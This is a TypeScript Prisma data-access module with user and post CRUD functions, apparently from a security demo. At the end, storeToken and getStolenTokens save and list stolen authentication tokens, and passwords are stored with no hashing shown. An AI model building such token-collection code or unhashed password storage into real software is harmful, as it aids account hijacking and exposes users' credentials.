import { prisma } from './prisma';

export interface User {
  id: string;
  username: string;
  email: string;
  password: string;
  profilePicture?: string;
  membershipLevel: 'free' | 'premium' | 'vip';
}

export interface Post {
  id: string;
  userId: string;
  author: string;
  content: string;
  createdAt: Date;
}

// User関連メソッド
export async function getUsers(): Promise<User[]> {
  return prisma.user.findMany();
}

export async function getUserById(id: string): Promise<User | null> {
  return prisma.user.findUnique({
    where: { id }
  });
}

export async function getUserByEmail(email: string): Promise<User | null> {
  return prisma.user.findUnique({
    where: { email }
  });
}

export async function createUser(user: Omit<User, 'id'>): Promise<User> {
  return prisma.user.create({
    data: user
  });
}

export async function updateUser(id: string, data: Partial<User>): Promise<User | null> {
  return prisma.user.update({
    where: { id },
    data
  });
}

// Post関連メソッド
export async function getPosts(): Promise<Post[]> {
  return prisma.post.findMany();
}

export async function getPostById(id: string): Promise<Post | null> {
  return prisma.post.findUnique({
    where: { id }
  });
}

export async function createPost(post: Omit<Post, 'id' | 'createdAt'>): Promise<Post> {
  return prisma.post.create({
    data: post
  });
}

// 盗まれたトークンの保存
export async function storeToken(token: string): Promise<void> {
  await prisma.stolenToken.create({
    data: { token }
  });
  console.log('Token stolen and stored:', token);
}

export async function getStolenTokens(): Promise<{ token: string; timestamp: Date }[]> {
  return prisma.stolenToken.findMany();
}